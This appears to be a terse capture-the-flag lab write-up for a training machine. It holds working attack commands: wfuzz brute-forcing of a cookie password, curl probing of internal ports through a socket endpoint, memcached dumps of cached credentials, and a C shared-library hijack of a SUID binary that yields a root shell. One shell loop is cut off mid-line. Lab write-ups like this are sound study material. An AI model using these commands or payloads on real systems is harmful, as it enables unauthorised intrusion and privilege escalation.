first on the site there was a login page for admin we brutefored it then

on port 8080 we found wrong cookies error

so we brute cookies ..

then on ==refresing== page on port 80 we can read all data on port 8080

```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: FUZZ" --hh 322 http://10.10.10.86:8080  #first part of cookie
wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -H "Cookie: password=FUZZ" --hh 324 http://10.10.10.86:8080  #second part of cookie

curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=1&cmd=0xdf'  
curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=22&cmd=0xdf'
wfuzz -c -z range,1-65535 -u 'http://10.10.10.86:8080/socket?port=FUZZ&cmd=abc' -H "Cookie: password=secret" --hc=500   #checking range of ports which are open
```

port ==11211== we can do

==stats slabs    stats item  stats cachedump <number> 0 ==

we got user and creds from ==get users==   # we re logged in to get the data as it saves it in cache

`cat cracked | while read c; do hash=$(echo ${c} | cut -d: -f1);`

now root part we found a suid file

```
ldd /usr/bin/myexec 
it showed some .so files so we created a c payload

#cat .a.c 
void seclogin() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",0);
}

gcc -shared -fPIC /dev/shm/.a.c -o /dev/shm/libseclogin.so

#cat df.conf 
/dev/shm
ldconfig -f df.conf    #should be blank
ldd /usr/bin/myexec  # folder should change to directory u created the payload
root
```
